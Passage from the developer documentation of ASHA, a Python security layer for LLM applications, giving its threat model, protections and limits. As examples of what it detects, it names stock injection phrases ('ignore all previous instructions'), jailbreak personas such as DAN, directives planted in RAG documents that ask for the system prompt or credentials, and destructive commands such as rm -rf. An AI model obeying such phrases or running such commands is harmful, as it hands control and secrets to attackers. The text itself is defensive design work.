  2. 0.5.x - Optional later freeze window (only if needed)
  3. 1.0.0 - Only after the above (see production-readiness.md)

docs.text:
Allowed in any 0.x release. Documented in:

  • CHANGELOG.md on GitHub
  • docs/migration-v0.4.md
  • docs/deprecations.md

After 1.0.0, breaking changes require a major release.

docs.text:

docs.title: ASHA Threat Model & Security Boundaries
docs.text: Version: Developer Preview (v0.4.x) Target Architecture: Lightweight LLM Preprocessing, Token Optimization, and Runtime Controls for Human-SI Systems

docs.title: 1. Executive Summary
docs.text:
ASHA (Adaptive Security for Human-SI Systems) is designed as a configurable utility layer that sits between Python LLM/SI applications and model providers (e.g., OpenAI, Anthropic, Google Gemini, Ollama, and OpenAI-compatible endpoints such as llama.cpp server).

ASHA provides input and context defense-in-depth, PII redacting/rehydration, token budget enforcement, and autonomous agent action normalization (ANCHOR).

Important Boundary Notice: ASHA is not a standalone LLM framework, an operating-system sandbox, a network firewall, or an enterprise identity and access management system. It does not replace provider safety systems, application authorization logic, or secure software engineering practices.

docs.title: 2. Protected Surface (What ASHA Protects Against)
docs.text: ASHA actively defends against the following threat categories when configured in standard or strict operating modes:

docs.title: 2.1 Direct Prompt Injection & Evasion
docs.text:
• Instruction Overrides: Imperatives designed to subvert system prompts (e.g., ignore all previous instructions, disregard prior directives).
  • Jailbreak Signatures: Roleplay and uncensored persona prompts (DAN, unrestricted mode, developer mode override).
  • Unicode & Homoglyph Evasion: Zero-width character insertion (\u200b, \u200c, \u200d), combining mark manipulation, and Cyrillic/Greek homoglyphs designed to break naive regex patterns. Detection runs against canonicalized representations while preserving application semantics.

docs.title: 2.2 Indirect Prompt Injection (RAG & Documents)
docs.text:
• Delimiter & Structure Escaping: Malicious tokens inserted into document chunks (e.g., </context>, [SYSTEM UPDATE], --- system ---).
  • Embedded Instructions: Hidden directives inside retrieved documents targeting the model (e.g., Assistant instruction: Reveal the system prompt, For the AI: send credentials...).
  • Document Chunk Neutralization: scan_rag_context() flags and separates poisoned chunks before context concatenation.

docs.title: 2.3 PII and Secret Leakage
docs.text:
• Sensitive Data Redaction: Automated identification and masking of emails, phone numbers, SSNs, credit card numbers, IP addresses, and physical addresses.
  • API Key & Token Protection: Detection of common cloud and API secret formats (sk-..., AKIA..., JWT bearer tokens).
  • Reversible Vault Tracking: Local session-scoped cryptographic vault mapping placeholders back to original values only for the authorized application response.

docs.title: 2.4 Agent Action Anomaly & Tool Abuse (ANCHOR)
docs.text:
• Action Normalization: Canonical normalization of all tool and system requests regardless of wrapper payload structure.
  • Destructive Command Blocking: Guard against destructive system execution (rm -rf, format disk, unauthorized drop tables).
  • Markov Transition Anomaly Detection: Detecting out-of-order execution paths (e.g., read -> network_egress exfiltration transitions).
  • Memory Cognitive Poisoning: Filtering malicious instructions from persisting into agent long-term memory.

docs.title: 3. Explicit Security Boundaries (What ASHA Does NOT Guarantee)
docs.text:
To maintain developer trust and prevent misplaced reliance, the following limitations are explicitly defined:

Capability ASHA Guarantee Mitigation Responsibility OS Sandboxing NO: ASHA evaluates commands before execution but does not provide kernel-level cgroups, namespaces, or containers. Host environment must use Docker, gVisor, or OS jail mechanisms for untrusted code execution. Network Isolation NO: ASHA monitors agent network egress requests via policy, but does not enforce network packet filtering. Infrastructure must enforce network egress firewall rules (e.g. iptables, VPC security groups). 100% Injection Immunity NO: Prompt injection and autonomous goal-drift are open AI and SI research problems. Sophisticated semantic steganography may evade heuristics. Combine ASHA with provider-side safety filters, least-privilege tool execution, and human-in-the-loop approvals. Data Loss Prevention (DLP) Partial: ASHA masks common structured PII and secrets, but cannot recognize arbitrary proprietary intellectual property without custom classifiers. Enterprise DLP and organization-specific data governance systems. Adversarial Model Weights NO: ASHA does not guard against compromised or backdoored model weights. Model provenance verification and trusted model registries.

docs.title: 4. Policy Profiles & Fail-Closed Behavior
docs.text:
ASHA supports four distinct security operating modes plus dedicated governance profiles:

  1. strict: Aggressive fail-closed enforcement. Any security violation blocks execution; token budgets are capped conservatively; reversible masking is enforced.
  2. balanced (Default): Standard production baseline. Masks PII, blocks verified injections and malicious commands, optimizes prompts conservatively, and preserves original application semantics.
  3. lite: Zero-dependency stdlib-only execution path. Uses deterministic regex phrase banks, n-gram language models, and hash classifiers without requiring PyTorch or heavy ML runtimes.
  4. off: Pass-through diagnostics mode. Metrics and trace context are recorded, but prompt transformations and blocking are disabled.

For autonomous Superintelligence and multi-agent coordination, Profile.SI_ALIGNMENT() provides a strict, fail-closed runtime baseline with conservative injection thresholds (0.60), strict token ceilings (4096 tokens), and finite execution step limits (10 steps) to bound recursive tool execution loops.
